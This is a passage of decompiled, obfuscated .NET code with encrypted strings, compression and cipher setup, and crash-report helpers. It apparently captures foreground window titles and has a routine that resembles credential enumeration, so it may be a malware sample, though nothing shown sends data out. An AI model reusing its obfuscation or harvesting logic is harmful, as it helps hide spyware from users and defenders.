      bool flag;
      try
      {
        numArray1 = \u0007.\u0001(obj0);
        goto label_7;
      }
      catch (Exception ex)
      {
        \u0007.\u0001(obj2, \u0006.\u0006.\u0001, \u000F.\u0006.\u0001);
        flag = false;
      }
label_6:
      return flag;
label_7:
      byte[] numArray2 = \u0007.\u0001(numArray1, \u000E.\u0003.\u0001(2108));
      if (numArray2 != null)
      {
        if (true)
        {
          \u0007.\u0001(obj2, \u0006.\u0006.\u0002);
          \u0004.\u0003 obj3 = new \u0004.\u0003(\u000E.\u0003.\u0001(2434));
          if (obj2.\u0001 != null)
            obj3.\u0001 = obj2.\u0001;
          \u000E.\u0004.\u0001 obj4 = new \u000E.\u0004.\u0001(obj2, numArray2, obj3, obj1);
          \u0007.\u0001(obj3, new \u0002.\u0004(obj4.\u0001));
          return obj4.\u0001;
        }
        goto label_6;
      }
      else
      {
        \u0007.\u0001(obj2, \u0006.\u0006.\u0001, \u0006.\u0005.\u0001);
        return false;
      }
    }

    static unsafe void \u0001([In] \u000F.\u0006.\u0007 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      int num;
      try
      {
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < obj0.\u0001)
        {
          *(int*) ((IntPtr) voidPtr + 4) = (int) obj0.\u0002[*(int*) voidPtr] & (int) byte.MaxValue;
          num = (int) obj0.\u0001[*(int*) voidPtr];
          if (num-- != 0)
          {
            *(int*) ((IntPtr) voidPtr + 8) = \u0007.\u0001(obj0, *(int*) ((IntPtr) voidPtr + 4));
            \u0007.\u0001(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 8));
            *(int*) ((IntPtr) voidPtr + 12) = (*(int*) ((IntPtr) voidPtr + 8) - 261) / 4;
            if (*(int*) ((IntPtr) voidPtr + 12) > 0 && *(int*) ((IntPtr) voidPtr + 12) <= 5)
              \u0007.\u0001(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4) & (1 << *(int*) ((IntPtr) voidPtr + 12)) - 1, *(int*) ((IntPtr) voidPtr + 12));
            *(int*) ((IntPtr) voidPtr + 16) = \u0007.\u0001(obj0, num);
            \u0007.\u0001(obj0.\u0002, *(int*) ((IntPtr) voidPtr + 16));
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 16) / 2 - 1;
            if (*(int*) ((IntPtr) voidPtr + 12) > 0)
              \u0007.\u0001(obj0.\u0001, num & (1 << *(int*) ((IntPtr) voidPtr + 12)) - 1, *(int*) ((IntPtr) voidPtr + 12));
          }
          else
            \u0007.\u0001(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4));
          *(int*) voidPtr = *(int*) voidPtr + 1;
        }
        \u0007.\u0001(obj0.\u0001, 256);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) *(int*) ((IntPtr) voidPtr + 16);
        \u000F.\u0006.\u0007 obj = obj0;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) obj);
        throw;
      }
    }

    static unsafe void \u0001([In] bool obj0, [In] int obj1, [In] byte[] obj2, [In] int obj3, [In] \u000F.\u0006.\u0007 obj4)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(24);
      short[] numArray1;
      try
      {
        (numArray1 = obj4.\u0001.\u0001)[256] = (short) ((int) numArray1[256] + 1);
        \u0007.\u0001(obj4.\u0001);
        \u0007.\u0001(obj4.\u0002);
        \u000F.\u0006.\u0007.\u0001 obj5 = obj4.\u0001;
        \u0007.\u0001(obj4.\u0003, obj5);
        \u000F.\u0006.\u0007.\u0001 obj6 = obj4.\u0002;
        \u0007.\u0001(obj4.\u0003, obj6);
        \u0007.\u0001(obj4.\u0003);
        *(int*) voidPtr = 4;
        *(int*) ((IntPtr) voidPtr + 4) = 18;
        while (*(int*) ((IntPtr) voidPtr + 4) > *(int*) voidPtr)
        {
          if (obj4.\u0003.\u0001[\u000F.\u0006.\u0007.\u0001[*(int*) ((IntPtr) voidPtr + 4)]] > (byte) 0)
            *(int*) voidPtr = *(int*) ((IntPtr) voidPtr + 4) + 1;
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = 14 + *(int*) voidPtr * 3 + \u0007.\u0001(obj4.\u0003) + \u0007.\u0001(obj4.\u0001) + \u0007.\u0001(obj4.\u0002) + obj4.\u0002;
        *(int*) ((IntPtr) voidPtr + 12) = obj4.\u0002;
        *(int*) ((IntPtr) voidPtr + 16) = 0;
        while (*(int*) ((IntPtr) voidPtr + 16) < 286)
        {
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (int) obj4.\u0001.\u0001[*(int*) ((IntPtr) voidPtr + 16)] * (int) \u000F.\u0006.\u0007.\u0003[*(int*) ((IntPtr) voidPtr + 16)];
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
        }
        *(int*) ((IntPtr) voidPtr + 20) = 0;
        while (*(int*) ((IntPtr) voidPtr + 20) < 30)
        {
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (int) obj4.\u0002.\u0001[*(int*) ((IntPtr) voidPtr + 20)] * (int) \u000F.\u0006.\u0007.\u0004[*(int*) ((IntPtr) voidPtr + 20)];
          *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) + 1;
        }
        if (*(int*) ((IntPtr) voidPtr + 8) >= *(int*) ((IntPtr) voidPtr + 12))
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 12);
        if (obj3 >= 0 && obj1 + 4 < *(int*) ((IntPtr) voidPtr + 8) >> 3)
          \u0007.\u0001(obj2, obj3, obj0, obj1, obj4);
        else if (*(int*) ((IntPtr) voidPtr + 8) == *(int*) ((IntPtr) voidPtr + 12))
        {
          \u0007.\u0001(obj4.\u0001, 2 + (obj0 ? 1 : 0), 3);
          \u000F.\u0006.\u0007.\u0001 obj7 = obj4.\u0001;
          short[] numArray2 = \u000F.\u0006.\u0007.\u0002;
          byte[] numArray3 = \u000F.\u0006.\u0007.\u0003;
          \u0007.\u0001(numArray2, obj7, numArray3);
          \u000F.\u0006.\u0007.\u0001 obj8 = obj4.\u0002;
          short[] numArray4 = \u000F.\u0006.\u0007.\u0003;
          byte[] numArray5 = \u000F.\u0006.\u0007.\u0004;
          \u0007.\u0001(numArray4, obj8, numArray5);
          \u0007.\u0001(obj4);
          \u0007.\u0001(obj4);
        }
        else
        {
          \u0007.\u0001(obj4.\u0001, 4 + (obj0 ? 1 : 0), 3);
          \u0007.\u0001(obj4, *(int*) voidPtr);
          \u0007.\u0001(obj4);
          \u0007.\u0001(obj4);
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[12]
        {
          (object) *(int*) voidPtr,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 20),
          (object) numArray1,
          (object) obj4,
          (object) obj2,
          (object) obj3,
          (object) obj1,
          (object) obj0
        };
        \u0007.\u0001(ex, objArray);
        throw;
      }
    }

    static void \u0001([In] short[] obj0, [In] \u000F.\u0006.\u0007.\u0001 obj1, [In] byte[] obj2)
    {
label_0:
      try
      {
        if (false)
          goto label_2;
        else
          goto label_4;
label_1:
        if (true)
          obj1.\u0001 = obj2;
        else
          goto label_0;
label_2:
        if (true)
          return;
        goto label_1;
label_4:
        obj1.\u0002 = obj0;
        goto label_1;
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0007.\u0001 obj = obj1;
        short[] numArray1 = obj0;
        byte[] numArray2 = obj2;
        \u0007.\u0001(ex, (object) obj, (object) numArray1, (object) numArray2);
        throw;
      }
    }

    static string \u0001() => \u000E.\u0003.\u0001(2483) + \u000E.\u0003.\u0001(1603) + (object) \u0007.\u0001();

    static bool \u0001([In] int obj0, [In] string obj1, [In] ref IntPtr obj2, [In] ref int obj3)
    {
      bool flag;
      return flag;
    }

    static void \u0001([In] int obj0, [In] \u000F.\u0006.\u000F obj1)
    {
      try
      {
        do
        {
          if (true)
            goto label_4;
label_1:
          if (true)
            continue;
          goto label_5;
label_4:
          obj1.WriteByte((byte) (obj0 & (int) byte.MaxValue));
label_5:
          obj1.WriteByte((byte) (obj0 >> 8 & (int) byte.MaxValue));
          goto label_1;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u000F obj = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj0;
        \u0007.\u0001(ex, (object) obj, (object) local);
        throw;
      }
    }

    static void \u0001([In] Exception obj0, [In] \u0002.\u0003 obj1)
    {
      using (new \u0003.\u0005(obj1.\u0001, \u000E.\u0003.\u0001(2504)))
      {
        try
        {
          System.Type type = obj0.GetType();
          obj1.\u0001(type);
          do
          {
            string str = \u000E.\u0003.\u0001(2517);
            try
            {
              str = obj0.Message;
            }
            catch
            {
            }
            obj1.\u0001.WriteAttributeString(\u000E.\u0003.\u0001(2522), str);
          }
          while (false);
          string str1 = obj0.StackTrace.Trim();
          do
          {
            obj1.\u0001.WriteAttributeString(\u000E.\u0003.\u0001(2535), str1);
            int num = str1.IndexOf(' ');
            str1 = str1.Substring(num + 1);
          }
          while (false);
          int length = str1.IndexOf(\u000E.\u0003.\u0001(2564));
          if (length != -1)
            str1 = str1.Substring(0, length);
          obj1.\u0001.WriteAttributeString(\u000E.\u0003.\u0001(2569), str1);
          obj1.\u0001(new \u000E.\u0005((object) obj0, true));
        }
        catch
        {
        }
      }
    }

    static string \u0001([In] string obj0)
    {
label_0:
      byte[] bytes;
      int num1;
      char[] chars1;
      Decoder decoder1;
      UTF8Encoding utF8Encoding1;
      try
      {
        string str;
        try
        {
          utF8Encoding1 = new UTF8Encoding();
label_10:
          decoder1 = utF8Encoding1.GetDecoder();
          bytes = Convert.FromBase64String(obj0);
          int num2 = decoder1.GetCharCount(bytes, 0, bytes.Length);
          while (true)
          {
            num1 = num2;
            if (true)
            {
              if (true)
              {
                if (true)
                {
                  int num3 = num1;
                  int num4 = 1;
                  int num5;
                  int num6;
                  while (true)
                  {
                    num5 = checked (num3 - num4);
                    num6 = 1;
                    if (num6 == 0)
                    {
                      num4 = num6;
                      num3 = num5;
                    }
                    else
                      break;
                  }
                  chars1 = new char[checked (num5 + num6)];
                  int chars2 = decoder1.GetChars(bytes, 0, bytes.Length, chars1, 0);
                  if (false)
                    num2 = chars2;
                  else
                    break;
                }
                else
                  goto label_10;
              }
              else
                goto label_12;
            }
            else
              goto label_0;
          }
          str = new string(chars1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
label_12:
        return str;
      }
      catch (Exception ex)
      {
        string str1;
        string str2 = str1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) num1;
        char[] chArray = chars1;
        UTF8Encoding utF8Encoding2 = utF8Encoding1;
        string str3;
        string str4 = str3;
        byte[] numArray = bytes;
        Decoder decoder2 = decoder1;
        string str5 = obj0;
        \u0007.\u0001(ex, (object) str2, (object) local, (object) chArray, (object) utF8Encoding2, (object) str4, (object) numArray, (object) decoder2, (object) str5);
        throw;
      }
    }

    static void \u0001([In] byte[] obj0, [In] int obj1, [In] bool obj2, [In] int obj3, [In] \u000F.\u0006.\u0007 obj4)
    {
      try
      {
        if (true)
          \u0007.\u0001(obj4.\u0001, obj2 ? 1 : 0, 3);
        \u0007.\u0001(obj4.\u0001);
        int num1 = obj3;
        while (true)
        {
          \u000F.\u0006.\u000E obj = obj4.\u0001;
          \u0007.\u0001(num1, obj);
          int num2;
          do
          {
            num2 = obj3;
            if (true)
            {
              \u0007.\u0001(~num2, obj4.\u0001);
              \u0007.\u0001(obj1, obj3, obj0, obj4.\u0001);
            }
            else
              goto label_8;
          }
          while (false);
          break;
label_8:
          num1 = num2;
        }
        \u0007.\u0001(obj4);
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0007 obj = obj4;
        byte[] numArray = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local3 = (ValueType) obj2;
        \u0007.\u0001(ex, (object) obj, (object) numArray, (object) local1, (object) local2, (object) local3);
        throw;
      }
    }

    static void \u0001([In] \u000F.\u0006.\u0006 obj0, [In] byte[] obj1)
    {
      try
      {
        \u0007.\u0001(obj0.\u0001, obj1);
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0006 obj = obj0;
        byte[] numArray = obj1;
        \u0007.\u0001(ex, (object) obj, (object) numArray);
        throw;
      }
    }

    static unsafe int \u0001()
    {
      void* voidPtr;
      do
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(8);
        try
        {
          do
          {
            if (true)
              goto label_3;
label_2:
            continue;
label_3:
            *(int*) voidPtr = \u0003.\u0001.\u0001.Length;
            goto label_2;
          }
          while (false);
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) voidPtr;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) *(int*) voidPtr;
          \u0007.\u0001(ex, (object) local);
          throw;
        }
      }
      while (false);
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    static short \u0001([In] int obj0)
    {
      short num1;
      try
      {
        int num2 = (int) \u000F.\u0006.\u0007.\u0001[obj0 & 15];
        if (true)
          num2 <<= 12;
        int num3;
        if (true)
        {
          int num4 = (int) \u000F.\u0006.\u0007.\u0001[obj0 >> 4 & 15];
          int num5;
          while (true)
          {
            num5 = num4 << 8;
            if (false)
              num4 = num5;
            else
              break;
          }
          num3 = num2 | num5;
        }
        else
          goto label_7;
label_6:
        int num6 = (int) \u000F.\u0006.\u0007.\u0001[obj0 >> 8 & 15] << 4;
        num2 = num3 | num6 | (int) \u000F.\u0006.\u0007.\u0001[obj0 >> 12];
label_7:
        num3 = (int) (short) num2;
        if (true)
          num1 = (short) num3;
        else
          goto label_6;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj0;
        \u0007.\u0001(ex, (object) local);
        throw;
      }
      return num1;
    }

    static void \u0001([In] Exception obj0, [In] object obj1)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        \u0007.\u0001(obj0, new object[1]{ obj1 });
        goto label_2;
      }
      while (false);
    }

    static unsafe void \u0001([In] Exception obj0, [In] object[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      *(int*) voidPtr = -1;
      *(int*) ((IntPtr) voidPtr + 4) = -1;
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      StackTrace stackTrace = new StackTrace(obj0);
      try
      {
        switch (obj0.StackTrace)
        {
          case null:
            break;
          default:
            string[] strArray = obj0.StackTrace.Split('\r', '\n');
            *(int*) ((IntPtr) voidPtr + 12) = 0;
            while (*(int*) ((IntPtr) voidPtr + 12) < strArray.Length)
            {
              if (strArray[*(int*) ((IntPtr) voidPtr + 12)].Length > 0)
                *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
              *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
            }
            break;
        }
      }
      catch
      {
        *(int*) ((IntPtr) voidPtr + 8) = -1;
      }
      try
      {
        if (stackTrace.FrameCount > 0)
        {
          StackFrame frame = stackTrace.GetFrame(stackTrace.FrameCount - 1);
          *(int*) voidPtr = (frame.GetMethod().MetadataToken & 16777215) - 1;
          *(int*) ((IntPtr) voidPtr + 4) = frame.GetILOffset();
        }
      }
      catch
      {
      }
      try
      {
        SmartStackFrame smartStackFrame = new SmartStackFrame(*(int*) voidPtr, obj1, *(int*) ((IntPtr) voidPtr + 4), *(int*) ((IntPtr) voidPtr + 8));
        LinkedList<object> linkedList;
        if (!obj0.Data.Contains((object) \u000E.\u0003.\u0001(2578)))
        {
          linkedList = new LinkedList<object>();
          obj0.Data[(object) \u000E.\u0003.\u0001(2578)] = (object) linkedList;
        }
        else
          linkedList = (LinkedList<object>) obj0.Data[(object) \u000E.\u0003.\u0001(2578)];
        linkedList.AddLast((object) smartStackFrame);
      }
      catch
      {
      }
    }

    static int \u0001([In] \u000F.\u0006.\u000E obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        if (obj0.\u0003 >= 8)
        {
          byte[] numArray = obj0.\u0001;
          \u000F.\u0006.\u000E obj = obj0;
          int num2;
          num1 = num2 = obj.\u0002;
          obj.\u0002 = num2 + 1;
          int index = num1;
          int num3 = (int) (byte) obj0.\u0001;
          numArray[index] = (byte) num3;
          obj0.\u0001 >>= 8;
          obj0.\u0003 -= 8;
        }
        if (obj3 <= obj0.\u0002 - obj0.\u0001)
        {
          Array.Copy((Array) obj0.\u0001, obj0.\u0001, (Array) obj1, obj2, obj3);
          obj0.\u0001 += obj3;
        }
        else
          goto label_5;
label_2:
        return obj3;
label_5:
        obj3 = obj0.\u0002 - obj0.\u0001;
        Array.Copy((Array) obj0.\u0001, obj0.\u0001, (Array) obj1, obj2, obj3);
        obj0.\u0001 = 0;
        obj0.\u0002 = 0;
        goto label_2;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u000F.\u0006.\u000E obj = obj0;
        byte[] numArray = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj3;
        \u0007.\u0001(ex, (object) local1, (object) obj, (object) numArray, (object) local2, (object) local3);
        throw;
      }
    }

    static string \u0001() => \u000E.\u0003.\u0001(2483);

    static unsafe void \u0001([In] \u000F.\u0006.\u0008 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      try
      {
        byte[] sourceArray = obj0.\u0001;
        byte[] destinationArray = obj0.\u0001;
        if (true)
          goto label_8;
label_2:
        obj0.\u0002 -= 32768;
        obj0.\u0005 -= 32768;
        obj0.\u0004 -= 32768;
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < 32768)
        {
          *(int*) ((IntPtr) voidPtr + 4) = (int) obj0.\u0001[*(int*) voidPtr] & (int) ushort.MaxValue;
          obj0.\u0001[*(int*) voidPtr] = *(int*) ((IntPtr) voidPtr + 4) >= 32768 ? (short) (*(int*) ((IntPtr) voidPtr + 4) - 32768) : (short) 0;
          *(int*) voidPtr = *(int*) voidPtr + 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = 0;
        while (*(int*) ((IntPtr) voidPtr + 8) < 32768)
        {
          *(int*) ((IntPtr) voidPtr + 12) = (int) obj0.\u0002[*(int*) ((IntPtr) voidPtr + 8)] & (int) ushort.MaxValue;
          obj0.\u0002[*(int*) ((IntPtr) voidPtr + 8)] = *(int*) ((IntPtr) voidPtr + 12) >= 32768 ? (short) (*(int*) ((IntPtr) voidPtr + 12) - 32768) : (short) 0;
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
        }
        return;
label_8:
        Array.Copy((Array) sourceArray, 32768, (Array) destinationArray, 0, 32768);
        goto label_2;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        \u000F.\u0006.\u0008 obj = obj0;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) obj);
        throw;
      }
    }

    static ICryptoTransform \u0001(
      [In] byte[] obj0,
      [In] \u0008.\u0004 obj1,
      [In] byte[] obj2,
      [In] bool obj3)
    {
      object[] objArray1;
      MethodInfo method;
      try
      {
        MethodInfo setMethod1 = obj1.\u0001.GetProperty("Key").GetSetMethod();
        object obj4 = obj1.\u0001;
        objArray1 = new object[1]{ (object) obj0 };
        object[] parameters1 = objArray1;
        setMethod1.Invoke(obj4, parameters1);
        MethodInfo setMethod2 = obj1.\u0001.GetProperty("IV").GetSetMethod();
        object obj5 = obj1.\u0001;
        objArray1 = new object[1]{ (object) obj2 };
        object[] parameters2 = objArray1;
        setMethod2.Invoke(obj5, parameters2);
        method = obj1.\u0001.GetMethod(obj3 ? "CreateDecryptor" : "CreateEncryptor", new System.Type[0]);
        return (ICryptoTransform) method.Invoke(obj1.\u0001, new object[0]);
      }
      catch (Exception ex)
      {
        MethodInfo methodInfo = method;
        object[] objArray2 = objArray1;
        \u0008.\u0004 obj = obj1;
        byte[] numArray1 = obj0;
        byte[] numArray2 = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) obj3;
        \u0007.\u0001(ex, (object) methodInfo, (object) objArray2, (object) obj, (object) numArray1, (object) numArray2, (object) local);
        throw;
      }
    }

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLength", CharSet = CharSet.Auto, SetLastError = true)]
    static extern int \u0001([In] IntPtr obj0);

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", SetLastError = true)]
    static extern IntPtr \u0001();

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(13);
      IntPtr zero;
      IntPtr[] numArray;
      IntPtr num1;
      \u000F.\u0002.\u0001.\u0002 structure;
      \u000F.\u0002.\u0001.\u0001 obj1;
      \u000F.\u0002.\u0001.\u0001 obj2;
      string[] strArray;
      string str;
      try
      {
        str = \u0007.\u0001(\u000E.\u0003.\u0001(2603), \u000E.\u0003.\u0001(55));
        *(int*) voidPtr = 0;
        zero = IntPtr.Zero;
        numArray = (IntPtr[]) null;
        *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) \u0007.\u0001(0, \u0007.\u0001(\u000E.\u0003.\u0001(2612), \u000E.\u0003.\u0001(55)), ref zero, ref *(int*) voidPtr);
        try
        {
          if (*(sbyte*) ((IntPtr) voidPtr + 12) == (sbyte) 0)
            return;
          numArray = new IntPtr[checked (*(int*) voidPtr - 1 + 1)];
label_4:
          num1 = zero;
          IntPtr num2 = (IntPtr) voidPtr + 4;
          *(int*) ((IntPtr) voidPtr + 8) = checked (*(int*) voidPtr - 1);
          *(int*) num2 = 0;
          while (*(int*) ((IntPtr) voidPtr + 4) <= *(int*) ((IntPtr) voidPtr + 8))
          {
            numArray[*(int*) ((IntPtr) voidPtr + 4)] = Marshal.ReadIntPtr((IntPtr) checked (num1.ToInt32() + IntPtr.Size * *(int*) unchecked ((IntPtr) voidPtr + 4)));
            structure = (\u000F.\u0002.\u0001.\u0002) Marshal.PtrToStructure(numArray[*(int*) ((IntPtr) voidPtr + 4)], typeof (\u000F.\u0002.\u0001.\u0002));
            obj1 = new \u000F.\u0002.\u0001.\u0001();
            if (true)
            {
              obj2 = new \u000F.\u0002.\u0001.\u0001();
              obj1.\u0001 = structure.\u0006;
              obj1.\u0001 = (int) structure.\u0005;
              \u0007.\u0001(0, ref obj2, 0, 0, 0, ref obj1, 1);
              strArray = new string[11]
              {
                \u0007.\u0001(\u000E.\u0003.\u0001(2653), \u000E.\u0003.\u0001(55)),
                Environment.NewLine,
                Environment.NewLine,
                \u0007.\u0001(\u000E.\u0003.\u0001(2714), \u000E.\u0003.\u0001(55)),
                Marshal.PtrToStringAuto(structure.\u0010),
                Environment.NewLine,
                \u0007.\u0001(\u000E.\u0003.\u0001(2739), \u000E.\u0003.\u0001(55)),
                Marshal.PtrToStringAuto(obj1.\u0001),
                Environment.NewLine,
                Environment.NewLine,
                \u0007.\u0001(\u000E.\u0003.\u0001(2764), \u000E.\u0003.\u0001(55))
              };
              str = string.Concat(strArray);
              *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
            }
            else
              goto label_4;
          }
          \u000E.\u0001.\u0006 = str;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u000E.\u0001.\u0006 = \u0007.\u0001(\u000E.\u0003.\u0001(2603), \u000E.\u0003.\u0001(55));
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[12]
        {
          (object) (bool) *(sbyte*) ((IntPtr) voidPtr + 12),
          (object) *(int*) voidPtr,
          (object) str,
          (object) zero,
          (object) numArray,
          (object) num1,
          (object) structure,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) obj1,
          (object) obj2,
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) strArray
        };
        \u0007.\u0001(ex, objArray);
        throw;
      }
    }

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5,
      [In] object obj6,
      [In] object obj7,
      [In] object obj8,
      [In] object obj9)
    {
      \u0007.\u0001(obj0, new object[9]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5,
        obj6,
        obj7,
        obj8,
        obj9
      });
    }

    static unsafe int \u0001([In] \u000F.\u0006.\u0002 obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(12);
      if (true)
        goto label_20;
label_1:
      void* voidPtr;
      int num2;
      try
      {
        *(int*) voidPtr = 0;
label_3:
        int num3 = obj0.\u0003;
        int num4;
        for (int index = 0; num3 > index && obj3 > 0; num3 = num4)
        {
          obj1[obj2++] = (byte) obj0.\u0001;
          obj0.\u0001 >>= 8;
          obj0.\u0003 -= 8;
          num4 = obj3;
          int num5 = 1;
          if (num5 != 0)
          {
            int num6 = num4 - num5;
            if (true)
              obj3 = num6;
            *(int*) voidPtr = *(int*) voidPtr + 1;
            goto label_3;
          }
          else
            index = num5;
        }
        if (obj3 == 0)
        {
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
        }
        else
        {
          *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0002 - obj0.\u0001;
          if (obj3 > *(int*) ((IntPtr) voidPtr + 4))
          {
            if (true)
              obj3 = *(int*) ((IntPtr) voidPtr + 4);
            else
              goto label_12;
          }
          Array.Copy((Array) obj0.\u0001, obj0.\u0001, (Array) obj1, obj2, obj3);
          if (true)
            obj0.\u0001 += obj3;
          else
            goto label_19;
label_12:
          if ((obj0.\u0001 - obj0.\u0002 & 1) != 0)
          {
            \u000F.\u0006.\u0002 obj = obj0;
            byte[] numArray = obj0.\u0001;
            num2 = obj0.\u0001++;
            int index = num2;
            int num7 = (int) numArray[index] & (int) byte.MaxValue;
            obj.\u0001 = (uint) num7;
            obj0.\u0003 = 8;
          }
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr + obj3;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num2;
        \u000F.\u0006.\u0002 obj = obj0;
        byte[] numArray = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) obj3;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) obj, (object) numArray, (object) local4, (object) local5);
        throw;
      }
label_19:
      return *(int*) ((IntPtr) voidPtr + 8);
label_20:
      voidPtr = (void*) num1;
      goto label_1;
    }

    static unsafe void \u0001([In] \u0003.\u0001 obj0, [In] ulong obj1)
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(62);
      if (true)
        goto label_46;
label_1:
      void* voidPtr;
      long[] numArray;
      try
      {
        if (\u0003.\u0001.\u0001[checked ((int) obj1)] != (byte) 13)
        {
          if (\u0003.\u0001.\u0001[checked ((int) obj1)] != (byte) 5)
            return;
          *(short*) ((IntPtr) voidPtr + 60) = (short) Convert.ToUInt16(Decimal.Subtract(new Decimal(\u0007.\u0001(Convert.ToInt32(Decimal.Add(new Decimal(obj1), 3M)), 2)), 1M));
          IntPtr num2 = (IntPtr) voidPtr + 44;
          *(int*) ((IntPtr) voidPtr + 52) = (int) *(ushort*) ((IntPtr) voidPtr + 60);
          *(int*) num2 = 0;
          while (*(int*) ((IntPtr) voidPtr + 44) <= *(int*) ((IntPtr) voidPtr + 52))
